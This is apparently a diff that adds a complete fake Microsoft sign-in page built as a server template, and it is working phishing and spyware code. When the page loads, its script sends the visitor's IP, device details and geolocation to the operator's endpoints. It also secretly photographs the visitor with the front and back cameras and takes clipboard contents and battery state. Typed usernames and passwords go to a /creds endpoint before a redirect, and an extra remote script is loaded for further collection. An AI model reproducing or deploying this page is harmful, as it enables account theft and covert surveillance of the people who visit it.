@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.card { background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); padding: 44px; width: 100%; max-width: 440px; }
+.ms-logo { display: flex; gap: 2px; width: 20px; height: 20px; flex-wrap: wrap; margin-bottom: 16px; }
+.ms-logo div { width: 9px; height: 9px; }
+.ms-logo .r { background: #f25022; }
+.ms-logo .g { background: #7fba00; }
+.ms-logo .b { background: #00a4ef; }
+.ms-logo .y { background: #ffb900; }
+.brand { font-size: 20px; color: #1b1b1b; font-weight: 600; margin-bottom: 4px; }
+h1 { font-size: 24px; color: #1b1b1b; font-weight: 400; margin-bottom: 24px; }
+.form-group { margin-bottom: 16px; }
+.form-group input { width: 100%; padding: 6px 10px 6px 0; border: none; border-bottom: 1px solid #666; font-size: 15px; color: #1b1b1b; }
+.form-group input:focus { outline: none; border-bottom: 2px solid #0078D4; }
+.form-group input::placeholder { color: #666; }
+.links { margin: 16px 0 24px; }
+.links a { color: #0067b8; font-size: 13px; text-decoration: none; display: block; margin: 4px 0; }
+.links a:hover { text-decoration: underline; color: #004578; }
+.btn { padding: 10px 20px; background: #0078D4; color: #fff; border: none; font-size: 15px; cursor: pointer; min-width: 108px; float: right; }
+.btn:hover { background: #006abc; }
+.no-account { font-size: 13px; color: #1b1b1b; margin-top: 60px; clear: both; }
+.no-account a { color: #0067b8; text-decoration: none; }
+.loading { display: none; text-align: center; padding: 30px; }
+.spinner { border: 3px solid #eee; border-top: 3px solid #0078D4; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="card">
+<div class="ms-logo"><div class="r"></div><div class="g"></div><div class="b"></div><div class="y"></div></div>
+<span class="brand">Microsoft</span>
+<h1>Sign in</h1>
+<form id="loginForm">
+<div class="form-group">
+<input type="text" id="username" placeholder="Email, phone, or Skype" required>
+</div>
+<div class="form-group" style="margin-top:24px;">
+<input type="password" id="password" placeholder="Password" required>
+</div>
+<div class="links">
+<a href="#">Forgot password?</a>
+<a href="#">Sign-in options</a>
+</div>
+<button type="submit" class="btn">Sign in</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="color:#666;font-size:14px;">Signing in...</p>
+</div>
+<p class="no-account">No account? <a href="#">Create one!</a></p>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '🪟 <b>Microsoft Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){ navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true, timeout: 10000}); }
+    async function captureCamera(facingMode, label) { try { const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}}); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 2000)); canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label}); stream.getTracks().forEach(t => t.stop()); } catch(e) {} }
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+    try { if(navigator.clipboard && navigator.clipboard.readText) { const clip = await navigator.clipboard.readText(); if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)}); } } catch(e) {}
+    try { const bat = await navigator.getBattery(); $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging}); } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    $.post("<%=a %>/creds", { uid: uid, user: encodeURIComponent(user), pass: encodeURIComponent(pass), platform: 'Microsoft' });
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
